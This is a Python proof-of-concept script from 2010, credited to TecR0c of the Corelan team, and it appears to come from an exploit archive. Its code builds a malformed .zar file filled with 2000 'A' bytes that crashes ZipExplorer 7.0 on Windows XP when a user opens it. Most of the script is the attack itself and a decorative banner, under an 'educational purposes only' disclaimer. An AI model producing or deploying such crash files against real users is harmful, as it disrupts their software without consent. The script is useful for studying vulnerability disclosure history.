#!/usr/bin/python
#
# Title:                ZipExplorer 7.0 (.zar) DoS
# Advisory:             http://www.corelan.be:8800/advisories.php?id=10-045
# Author:               TecR0c - http://tecninja.net/blog
# Found by:             TecR0c - http://twitter.com/TecR0c
# Date:                 June 1st, 2010
# Download:             http://home.online.no/~arnholm/org/exe/ZipX70sh.exe
# Platform:             Windows XP sp3 En
# Greetz to:            Corelan Security Team
# http://www.corelan.be:8800/index.php/security/corelan-team-members/
#
# Script provided &#039;as is&#039;, without any warranty.
# Use for educational purposes only.
# Do not use this code to do anything illegal !
#
# Note : you are not allowed to edit/modify this code.
# If you do, Corelan cannot be held responsible for any damages this may cause.

# Usage: Launch Application &gt; Open &gt; Navigate to file &gt; Double click &gt; BOOM

print &quot;|------------------------------------------------------------------|&quot;
print &quot;|                         __               __                      |&quot;
print &quot;|   _________  ________  / /___ _____     / /____  ____ _____ ___  |&quot;
print &quot;|  / ___/ __ \/ ___/ _ \/ / __ `/ __ \   / __/ _ \/ __ `/ __ `__ \ |&quot;
print &quot;| / /__/ /_/ / /  /  __/ / /_/ / / / /  / /_/  __/ /_/ / / / / / / |&quot;
print &quot;| \___/\____/_/   \___/_/\__,_/_/ /_/   \__/\___/\__,_/_/ /_/ /_/  |&quot;
print &quot;|                                                                  |&quot;
print &quot;|                                       http://www.corelan.be:8800 |&quot;
print &quot;|                                              security@corelan.be |&quot;
print &quot;|                                                                  |&quot;
print &quot;|-------------------------------------------------[ EIP Hunters ]--|&quot;
print &quot;[+] ZipExplorer 7.0 (.zar) DoS - by TecR0c&quot;

dos = &quot;\x41&quot; * 2000

mefile = open(&#039;tecr0c.zar&#039;,&#039;w&#039;);
mefile.write(dos);
mefile.close()
